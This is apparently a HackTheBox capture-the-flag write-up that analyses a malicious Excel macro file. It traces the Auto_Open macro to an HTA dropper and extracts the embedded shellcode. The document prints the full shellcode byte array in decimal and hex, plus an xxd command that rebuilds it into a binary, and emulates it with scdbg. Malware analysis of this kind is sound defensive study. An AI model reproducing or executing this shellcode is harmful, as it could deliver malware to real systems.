# HackTheBox-Writeups(oBfsC4t10n)

To start our hunt, we will use OLE tools to see if there are malicious macros in this XLSM file provided by the challenge.

OLE shows us this file includes a macro to execute LwTHLrGh.hta

```
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |LwTHLrGh.hta        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

When looking at the malicious file (LwTHLrGh.hta) we see an array of numbers

```
-35,-63,-65,32,86,66,126,-39,116,36-12,91,49,-55,-79,98,49,123,24,3,123,24,-125-61,36,-76,-73,-126,-52,-70,56,123,12,-37-79,-98,61,-37,-90,-21,109,-21,-83,-66,-127-128,-32,42,18,-28,44,92,-109,67,11,83,36,-1,111,-14,-90,2,-68,-44,-105,-52,-79,21,-48,49,59,71,-119,62,-18,120,-66,11,51,-14,-116-102,51,-25,68,-100,18,-74,-33,-57,-76,56,12,124,-3,34,81,-71,-73,-39,-95,53,70,8,-8-74,-27,117,53,69,-9,-78,-15,-74,-126,-54,2,74,-107,8,121,-112,16,-117,-39,83,-126,119-40,-80,85,-13,-42,125,17,91,-6,-128,-10,-41,6,8,-7,55,-113,74,-34,-109,-44,9,127,-123-80,-4,-128,-43,27,-96,36,-99,-79,-75,84-4,-35,122,85,-1,29,21,-18,-116,47,-70,68,27,3,51,67,-36,100,110,51,114,-101,-111,68,90,95,-59,20,-12,118,102,-1,4,119,-77,80,85,-41,108,17,5,-105,-36,-7,79,24,2,25,112,-13,43,50-88,-5,83,-61,-46,-115,58,-81,49,21,-46,66,43,-68,66,-77,-59,81,-76,-125,77,-17,-79,116,94,-80,2,72,-22,17,-7,-58,33,-14,113,127,119,127,26,76,37,2,-38,-38,96,-44,-18,-102-116,-15,-124,-37,110,-109,-112,-117,-26,97-91,42,76,-20,67,70,-94,-72,-36,-1,91,-31-105,-98,-92,60,-46,-95,47,-76,34,111,-40-67,48,-104,-65,61,-55,89,42,61,-93,93,-4,106,91,92,-39,92,-60,-97,12,-33,3,95,-47-23,120,86,71,85,23,-105,-121,85,-25,-63,-51,85-113,-75,-75,6,-86,-71,99,59,103,44,-116,109-37,-25,-28,-109,2,-49,-86,108,97,83,-84-110,-9,124,21,-6,7,61,-91,-6,109,-67,-11-110,122,-110,-6,82,-126,57,83,-6,9,-84,17-101,14,-27,-12,5,14,10,45,-74,117,95,-46,55,-118,-119,-73,56,-118,-75,-55,5,92,-116-65,72,92,-85,-80,-1,-63,-102,90,-1,86,-36,78
```

Based on what we see and the description of the scenario, lots of googling, and a good guess we can assume this is a hex payload! With that knowledge, we will use CyberChef to convert  it to Hex to make it usable.

```
dd c1 bf 20 56 42 7e d9 74 24 f4 5b 31 c9 b1 62 31 7b 18 03 7b 18 83 c3 
24 b4 b7 82 cc ba 38 7b 0c db b1 9e 3d db a6 eb 6d eb ad be 81 80 e0 2a 
12 e4 2c 5c 93 43 0b 53 24 ff 6f f2 a6 02 bc d4 97 cc b1 15 d0 31 3b 47 
89 3e ee 78 be 0b 33 f2 8c 9a 33 e7 44 9c 12 b6 df c7 b4 38 0c 7c fd 22 
51 b9 b7 d9 a1 35 46 08 f8 b6 e5 75 35 45 f7 b2 f1 b6 82 ca 02 4a 95 08 
79 90 10 8b d9 53 82 77 d8 b0 55 f3 d6 7d 11 5b fa 80 f6 d7 06 08 f9 37 
8f 4a de 93 d4 09 7f 85 b0 fc 80 d5 1b a0 24 9d b1 b5 54 fc dd 7a 55 ff 
1d 15 ee 8c 2f ba 44 1b 03 33 43 dc 64 6e 33 72 9b 91 44 5a 5f c5 14 f4 
76 66 ff 04 77 b3 50 55 d7 6c 11 05 97 dc f9 4f 18 02 19 70 f3 2b 32 a8 
fb 53 c3 d2 8d 3a af 31 15 d2 42 2b bc 42 b3 c5 51 b4 83 4d ef b1 74 5e 
b0 02 48 ea 11 f9 c6 21 f2 71 7f 77 7f 1a 4c 25 02 da da 60 d4 ee 9a 8c 
f1 84 db 6e 93 90 8b e6 61 a5 2a 4c ec 43 46 a2 b8 dc ff 5b e1 97 9e a4 
3c d2 a1 2f b4 22 6f d8 bd 30 98 bf 3d c9 59 2a 3d a3 5d fc 6a 5b 5c d9 
5c c4 9f 0c df 03 5f d1 e9 78 56 47 55 17 97 87 55 e7 c1 cd 55 8f b5 b5 
06 aa b9 63 3b 67 2c 8c 6d db e7 e4 93 02 cf aa 6c 61 53 ac 92 f7 7c 15 
fa 07 3d a5 fa 6d bd f5 92 7a 92 fa 52 82 39 53 fa 09 ac 11 9b 0e e5 f4 
05 0e 0a 2d b6 75 5f d2 37 8a 89 b7 38 8a b5 c9 05 5c 8c bf 48 5c ab b0 
ff c1 9a 5a ff 56 dc 4e
```

We can write a command to run and make this into a payload.

```
<<<
echo "dd c1 bf 20 56 42 7e d9 74 24 f4 5b 31 c9 b1 62 31 7b 18 03 7b 18 83 c3 
24 b4 b7 82 cc ba 38 7b 0c db b1 9e 3d db a6 eb 6d eb ad be 81 80 e0 2a 
12 e4 2c 5c 93 43 0b 53 24 ff 6f f2 a6 02 bc d4 97 cc b1 15 d0 31 3b 47 
89 3e ee 78 be 0b 33 f2 8c 9a 33 e7 44 9c 12 b6 df c7 b4 38 0c 7c fd 22 
51 b9 b7 d9 a1 35 46 08 f8 b6 e5 75 35 45 f7 b2 f1 b6 82 ca 02 4a 95 08 
79 90 10 8b d9 53 82 77 d8 b0 55 f3 d6 7d 11 5b fa 80 f6 d7 06 08 f9 37 
8f 4a de 93 d4 09 7f 85 b0 fc 80 d5 1b a0 24 9d b1 b5 54 fc dd 7a 55 ff 
1d 15 ee 8c 2f ba 44 1b 03 33 43 dc 64 6e 33 72 9b 91 44 5a 5f c5 14 f4 
76 66 ff 04 77 b3 50 55 d7 6c 11 05 97 dc f9 4f 18 02 19 70 f3 2b 32 a8 
fb 53 c3 d2 8d 3a af 31 15 d2 42 2b bc 42 b3 c5 51 b4 83 4d ef b1 74 5e 
b0 02 48 ea 11 f9 c6 21 f2 71 7f 77 7f 1a 4c 25 02 da da 60 d4 ee 9a 8c 
f1 84 db 6e 93 90 8b e6 61 a5 2a 4c ec 43 46 a2 b8 dc ff 5b e1 97 9e a4 
3c d2 a1 2f b4 22 6f d8 bd 30 98 bf 3d c9 59 2a 3d a3 5d fc 6a 5b 5c d9 
5c c4 9f 0c df 03 5f d1 e9 78 56 47 55 17 97 87 55 e7 c1 cd 55 8f b5 b5 
06 aa b9 63 3b 67 2c 8c 6d db e7 e4 93 02 cf aa 6c 61 53 ac 92 f7 7c 15 
fa 07 3d a5 fa 6d bd f5 92 7a 92 fa 52 82 39 53 fa 09 ac 11 9b 0e e5 f4 
05 0e 0a 2d b6 75 5f d2 37 8a 89 b7 38 8a b5 c9 05 5c 8c bf 48 5c ab b0 
ff c1 9a 5a ff 56 dc 4e" | xxd -r -p > testpayload.sc && xxd payload.sc | head
>>>
```

When run correctly you will see this 

```
00000000: ddc1 bf20 5642 7ed9 7424 f45b 31c9 b162  ... VB~.t$.[1..b
00000010: 317b 1803 7b18 83c3 24b4 b782 ccba 387b  1{..{...$.....8{
00000020: 0cdb b19e 3ddb a6eb 6deb adbe 8180 e02a  ....=...m......*
00000030: 12e4 2c5c 9343 0b53 24ff 6ff2 a602 bcd4  ..,\.C.S$.o.....
00000040: 97cc b115 d031 3b47 893e ee78 be0b 33f2  .....1;G.>.x..3.
00000050: 8c9a 33e7 449c 12b6 dfc7 b438 0c7c fd22  ..3.D......8.|."
00000060: 51b9 b7d9 a135 4608 f8b6 e575 3545 f7b2  Q....5F....u5E..
00000070: f1b6 82ca 024a 9508 7990 108b d953 8277  .....J..y....S.w
00000080: d8b0 55f3 d67d 115b fa80 f6d7 0608 f937  ..U..}.[.......7
00000090: 8f4a de93 d409 7f85 b0fc 80d5 1ba0 249d  .J............$.
```

Now we have the payload and can open our network-isolated VM and run the payload with SCDBG 

Run ```"git clone https://github.com/dzzie/VS_LIBEMU.git" in our command line to download SCDGB. (This is a Package of pre-compiled scdbg.exe, Gui Launcher, and CHM help file)```

launch the gui exe and import the shell code file (.sc)

launch the .sc and cmd will execute and you will see the flag!

https://www.hackthebox.com/achievement/challenge/882171/93
